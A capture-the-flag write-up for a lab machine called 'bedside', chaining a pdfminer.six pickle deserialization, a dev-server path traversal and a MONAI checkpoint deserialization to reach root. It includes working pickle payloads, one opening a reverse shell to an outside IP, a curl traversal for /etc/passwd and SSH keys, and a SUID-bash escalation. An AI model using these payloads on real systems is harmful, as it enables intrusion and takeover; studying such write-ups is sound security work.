# bedside

```
Nmap scan report for 10.129.41.194
Host is up, received echo-reply ttl 63 (0.065s latency).
Scanned at 2026-07-19 12:37:33 EDT for 21s
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE REASON         VERSION
22/tcp   open     ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open     http    syn-ack ttl 63 Apache httpd 2.4.68
|_http-server-header: Apache/2.4.68 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://bedside.htb/
3000/tcp filtered ppp     no-response
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=7/19%OT=22%CT=1%CU=36806%PV=Y%DS=2%DC=I%G=Y%TM=6A5CFD6
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=21)SE
OS:Q(SP=103%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=103%GCD=2%ISR=10C%TI=
OS:Z%CI=Z%II=I%TS=20)SEQ(SP=105%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=21)SEQ(SP=1
OS:08%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=21)OPS(O1=M552ST11NW7%O2=M552ST11NW7%
OS:O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.000 days (since Sun Jul 19 12:37:51 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

---

nothing interesting on main page, just some clinic shit spouting ai

fuzz for subdomains -> research.bedside.htb

has file upload for images for ai training. says limited to image formats, but also mentions archives can be used

site is php, but trying various methods to upload a webshell turn out fruitless

http header `X-Powered-By` tells us `pdfminer.six` is involved.

there was a python deserialization vulnerability in that tool in 2025. [advisory](https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp)

i'm not sure how to enumerate the version here, but we can just try it. we are specifically allowed to upload .gz archives and this vuln depends on that so...

when pdf2txt loads the cmap data for the pdf, it can perform a `pickle.loads` from attacker-controllable file. when resolving external cmap files, it appends `.pickle.gz` and can load directly from anywhere on the filesystem. we just need to reference it in the pdf that will get processed

make a malicious object such that when it gets `pickle.loads(..)`, our code is executed

```python
import pickle
import gzip
import os

class Bad:
    def __reduce__(self):
        cmd = "/bin/bash -c '/bin/bash -i &> /dev/tcp/10.10.14.160/9001 0>&1'"

        return (os.system,(cmd,))

cmap_data = Bad()
with gzip.open('ahha.pickle.gz', 'wb') as f:
    pickle.dump(cmap_data, f)
```

name it with .pickle.gz

now create a pdf that references the path of our "cmap data". we can leak the full path of the uploads dir via error message if we upload a file with mismatching content/mimetype. also we need to encode the `.`s

```pdf
%PDF-1.4
%
1 0 obj
<< /Pages 2 0 R /Type /Catalog >>
endobj
2 0 obj
<< /Count 1 /Kids [ 3 0 R ] /Type /Pages >>
endobj
3 0 obj
<< /Contents 4 0 R /MediaBox [ 0 0 612 792 ] /Parent 2 0 R /Resources << /Font << /F1 5 0 R >> >> /Type /Page >>
endobj
4 0 obj
<< /Length 52 /Filter /FlateDecode >>
stream
xs
�Ĝ�����b7M,.�.�.
              Tendstream
endobj
5 0 obj
<< /BaseFont /MaliciousFont-Identity-H /DescendantFonts [ 6 0 R ] /Encoding /#2fvar#2fwww#2fresearch#2ebedside#2ehtb#2fuploads#2fahha /Subtype /Type0 /Type /Font >>
endobj
6 0 obj
<< /BaseFont /MaliciousFont /CIDSystemInfo << /Ordering (Identity) /Registry (Adobe) /Supplement 0 >> /FontDescriptor 7 0 R /Subtype /CIDFontType2 /Type /Font >>
endobj
7 0 obj
<< /Ascent 1000 /CapHeight 800 /Descent -200 /Flags 4 /FontBBox [ -1000 -1000 1000 1000 ] /FontName /MaliciousFont /ItalicAngle 0 /StemV 80 /Type /FontDescriptor >>
endobj
xref
0 8
0000000000 65535 f 
0000000015 00000 n 
0000000064 00000 n 
0000000123 00000 n 
0000000251 00000 n 
0000000373 00000 n 
0000000549 00000 n 
0000000726 00000 n 
trailer << /Root 1 0 R /Size 8 /ID [<7de7569d8587c2ce8368146140b943ca><67c8ebd42fa3af7bb88c75d64c6be93a>] >>
startxref
906
%%EOF
```

i just copied the example pdf from the advisory, added my own path then used `qpdf` to try and fix the xref table.

`qpdf edit.pdf final.pdf`

## privesc

when we land on the box, we land in a docker container (.dockerenv at fs root). the requirements.txt in `/app` confirm pdfminer.six was pinned to version 20250506

user: `datawrangler` ; groups: `dataops`

couple interesting env vars:
- PYTHON_SHA256
- GPG_KEY

reading the source code of the pdf processor, there isn't much but it is revealed that outputs are getting placed in `/datastore/staging`. that dir is mounted from the host:

```
datawrangler@data-wrangler:/datastore$ df 
Filesystem     1K-blocks    Used Available Use% Mounted on
overlay          9893796 3785204   5990004  39% /
tmpfs              65536       0     65536   0% /dev
shm                65536       0     65536   0% /dev/shm
/dev/sda4        9893796 3785204   5990004  39% /datastore
tmpfs            1988556       0   1988556   0% /proc/acpi
tmpfs            1988556       0   1988556   0% /sys/firmware
```

there are a bunch of other dirs in there too, like `raw/` `processed/` `checkpoints/` `models/` `logs/`

all the files in staging are empty.

`portscan.sh` in /tmp... writeable by us...

i tried to see if it was cron'd from outside the container or some shit, no dice. just using it with 127.0.0.1 to scan the open ports, we will get ports listening on the host as well. the container is in host networking mode i think, because the ip from `/proc/net/fib_trie` is the same as decoded hex value from `/proc/net/route`

we get the port `3000` that nmap told us was filtered.

we do have curl though, and from that we can tell its some sort of image viewer made with react and esm.sh.

i noticed the path /@hmr, which has some script to connect via ws to /@hmr-ws as a "dev server", i guess this is a vite dev server. apparently you can just traverse for any file (wtf??)

`curl --path-as-is http://localhost:3000/../../../../../../../etc/passwd`

there is a user 'developer'. can find their ssh key `/home/developer/.ssh/id_rsa`

## root

user can run `/opt/trainer/bedside_trainer.py` as root nopasswd. some shit for training the models.

it uses torch and monai. turns out there is [another deserialization vuln](https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-6vm5-6jv9-rjpj) in monai when it loads the checkpoint files. here is the part of the script that will trigger that:

```python
    latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
    start_epoch = 0
    if latest_ckpt:
        logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...")
        loader = CheckpointLoader(
            load_path=str(latest_ckpt),
            load_dict={"model": model, "optimizer": optimizer},
            map_location=DEVICE
        )

        # Minimal mock engine for MONAI handler compatibility
        class MockEngine:
            def __init__(self):
                self.state = type("State", (), {})()
                self.state.max_epochs = None
                self.state.epoch = 0

        engine = MockEngine()
        loader(engine)  # invoke the handler directly
```

so we make another malicious pickle and dump it as a .pt file:

```python
import os
import torch


class Bad:
    def __reduce__(self):
        cmd = "cp /bin/bash /home/developer/hz ; chmod +s /home/developer/hz"
        return (os.system,(cmd,))


chkpnt = {
        'model_state_dict': Bad(),
        'optimizer_state_dict': {},
        'epoch': 100
}


torch.save(chkpnt,"/tmp/chkpnt.pt")
```

(/tmp has nosuid, so here i just use developer's home)

the script will just load the newest checkpoint in `/datastore/checkpoints`.

one thing that's annoying is the script fails to get to hit that point because it only works with image files (which is also mentioned in the script itself), and the pdf_watcher from earlier is constantly dumping empty .txt files into the staging directory. since `datawrangler` has perms over it, i just `chmod 777`d the whole shit, deleted the staging dir and recreated it with `developer` with 750 so those couldn't be written anymore

copy a png or jpg or some shit into staging so we can actually execute the deserialization. then run that shit

![pwn](/images/bedside/20260726_00h40m39s_grim.png)


